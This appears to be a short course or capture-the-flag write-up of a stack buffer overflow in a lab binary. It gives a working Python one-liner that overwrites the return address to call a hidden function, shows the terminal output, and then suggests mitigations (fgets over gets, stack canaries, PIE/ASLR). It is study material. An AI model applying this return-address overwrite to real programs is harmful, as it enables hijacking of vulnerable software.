# Proof of Concept

Basically there is no function that is called in the main function, in order to trigger the function that is able to fetch the flag, you need to measure the stack size and override the return pointer (RIP) to the target function address. The tricky place is that it contain multiple global variable that needs input from stdin, newcommer may feel confused to pass the hex format address into the stdin.

```
┌──(shan㉿host-vlah3-46)-[~/project/cs577]
└─$ python -c 'print "\x68\x69"+("B"*106)+"\xc5\x12\x40\x00\x00\x00\x00\x00"' | ./1.strip-new 
call my name if you can
let's begin by say 'hi':
my name:
[+]called by:uid=1000(shan) gid=1002(h2th3k) groups=1002(h2th3k),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner)
zsh: done                python -c 'print "\x68\x69"+("B"*106)+"\xc5\x12\x40\x00\x00\x00\x00\x00"' | 
zsh: segmentation fault  ./1.strip-new
```

# Mitigation suggestions vs vulneralbility:

1.Replace dangerous functions like gets with fgets

```
[0x004010a0]> afl
0x004010a0    1 42           entry0
... ...
0x00401030    1 6            sym.imp.puts
0x00401040    1 6            sym.imp.system
0x00401050    1 6            sym.imp.pclose
0x00401060    1 6            sym.imp.fgets
0x00401070    1 6            sym.imp.strcmp
0x00401080    1 6            sym.imp.gets
0x00401090    1 6            sym.imp.popen
...
```

2.Add checker for the buffer boundary of the stack object. And enable canary when compiling the binary.

3.Enable `-PIE` to support the ASLR. Redirect jumpping will be harder. (Still has SIGSEGV but the flag won't be printed out)

```
[0x004010a0]> afl
...
0x004012c5    4 179          sym.callme
...

┌──(shan㉿host-vlah3-46)-[~/project/cs577]
└─$ python -c 'print "\x68\x69"+("B"*106)+"\xd8\x12\x00\x00\x00\x00\x00\x00"' | ./1-withpie
call my name if you can
let's begin by say 'hi':
my name:
zsh: done                python -c 'print "\x68\x69"+("B"*106)+"\xd8\x12\x00\x00\x00\x00\x00\x00"' | 
zsh: segmentation fault  ./1-withpie
```

